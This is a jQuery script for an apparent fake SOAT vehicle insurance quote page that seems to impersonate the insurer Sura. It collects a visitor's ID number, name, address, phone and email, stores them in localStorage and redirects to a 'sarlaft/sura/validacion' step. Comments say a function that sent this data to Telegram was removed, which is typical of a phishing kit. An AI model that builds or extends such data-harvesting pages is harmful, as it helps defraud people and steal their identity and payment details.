$(document).ready(function () {
  const cache1 = localStorage.getItem("placa");
  const cache3 = localStorage.getItem("marca");
  const cache4 = localStorage.getItem("linea");
  const cache13 = localStorage.getItem("modelo");
  const cache5 = "PARTICULAR";
  let cache6 = "";
  let cache9 = "";

  // Función sendInfoTitular() eliminada - ya no se envían mensajes a Telegram

  if (/\d{3}$/.test(cache1)) {
    cache6 = "VEHÍCULO";
    cache9 = "6";
  } else {
    cache6 = "MOTOCICLETA";
    cache9 = "2";
  }

  const cache7 = localStorage.getItem("cilindraje");
  const cache12 = localStorage.getItem("valor");
  const numero = parseInt(cache12, 10);
  const numeroFormateado = new Intl.NumberFormat("es-CO").format(numero);

  $("#valuePlaca").text(cache1);
  $("#placaModalAgain").text(cache1);
  $("#marca").text(cache3);
  $("#marcaMovil").text(cache3);
  $("#linea").text(cache4);
  $("#lineaMovil").text(cache4);
  $("#modelovehic").text(cache13);
  $("#modelovehicMovil").text(cache13);
  $("#typeOfService").text(cache5);
  $("#classVehi").text(cache6);
  $("#cilindrajeDeEsaMonda").text(cache7);
  $("#pajaCeros").text(cache9);
  $("#precio").text(numeroFormateado);
  $("#precioMovil").text(numeroFormateado);

  function validarInputs() {
    const valorInput2 = $("#numeroDni").val().trim();
    const valorInput5 = $("#firstName").val().trim();
    const valorInput6 = $("#lastName").val().trim();
    const valorInput8 = $("#ciudadDeCir").val().trim();
    const valorInput9 = $("#direccionDeR").val().trim();
    const valorInput10 = $("#telephone").val().trim();
    const valorInput11 = $("#emailCorreo").val().trim();

    const cumpleInput2 = valorInput2.length >= 7;
    const cumpleInput5 = valorInput5.length >= 3;
    const cumpleInput6 = valorInput6.length >= 3;
    const cumpleInput8 = valorInput8.length >= 3;
    const cumpleInput9 = valorInput9.length >= 3;
    const cumpleInput10 = valorInput10.length == 10;
    const cumpleInput11 = valorInput11.length >= 9;

    console.log('Validación campos:', {
      numeroDni: valorInput2 + ' (' + cumpleInput2 + ')',
      firstName: valorInput5 + ' (' + cumpleInput5 + ')',
      lastName: valorInput6 + ' (' + cumpleInput6 + ')',
      ciudadDeCir: valorInput8 + ' (' + cumpleInput8 + ')',
      direccionDeR: valorInput9 + ' (' + cumpleInput9 + ')',
      telephone: valorInput10 + ' (' + cumpleInput10 + ')',
      emailCorreo: valorInput11 + ' (' + cumpleInput11 + ')'
    });

    if (
      cumpleInput2 &&
      cumpleInput5 &&
      cumpleInput6 &&
      cumpleInput8 &&
      cumpleInput9 &&
      cumpleInput10 &&
      cumpleInput11
    ) {
      $(".quote-button").prop("disabled", false);
      $(".btnpreciomov").prop("disabled", false);
    } else {
      $(".quote-button").prop("disabled", true);
      $(".btnpreciomov").prop("disabled", true);
    }
  }

  validarInputs();

  $(
    "#numeroDni, #firstName, #lastName, #ciudadDeCir, #direccionDeR, #telephone, #emailCorreo"
  ).on("input", function () {
    validarInputs();
  });

  $(".quote-button").on("click", function () {
    $("#fondoNegro").addClass("show");
    $("#fondoNegro").removeClass("displayNone");
    $("#modalPlacaTasSeguro").addClass("show");
    $("#modalPlacaTasSeguro").removeClass("displayNone");
  });

  $(".btnpreciomov").on("click", function () {
    $("#fondoNegro").addClass("show");
    $("#fondoNegro").removeClass("displayNone");
    $("#modalPlacaTasSeguro").addClass("show");
    $("#modalPlacaTasSeguro").removeClass("displayNone");
  });

  $("#cerrarModalManito").on("click", function () {
    $("#fondoNegro").removeClass("show");
    $("#fondoNegro").addClass("displayNone");
    $("#modalPlacaTasSeguro").removeClass("show");
    $("#modalPlacaTasSeguro").addClass("displayNone");
  });

  $("#btnConfirmarModal").on("click", function () {
    $("#fondoNegro").removeClass("show");
    $("#fondoNegro").addClass("displayNone");
    $("#modalPlacaTasSeguro").removeClass("show");
    $("#modalPlacaTasSeguro").addClass("displayNone");
    $("#loader").addClass("displayBlock");

    const valorInput999 = $("#direccionDeR").val();
    const valorInput777 = $("#numeroDni").val();
    const valorInput111 = $("#telephone").val();

    const nameCompl = $("#firstName").val() + " " + $("#lastName").val().trim();

    localStorage.setItem("direccionDinamica", valorInput999);
    localStorage.setItem("nombreGlobal", nameCompl);
    localStorage.setItem("cedulaGlobal", valorInput777);
    localStorage.setItem("telefonoGlobal", valorInput111);

    // sendInfoTitular(); // Función eliminada - ya no envía mensajes a Telegram

    setTimeout(function () {
      window.location.href = "../../../sarlaft/sura/validacion";
    }, 3000);
  });

  $("#btnBackModal").on("click", function () {
    window.location.href = "../seguro-obligatorio/";
  });
});
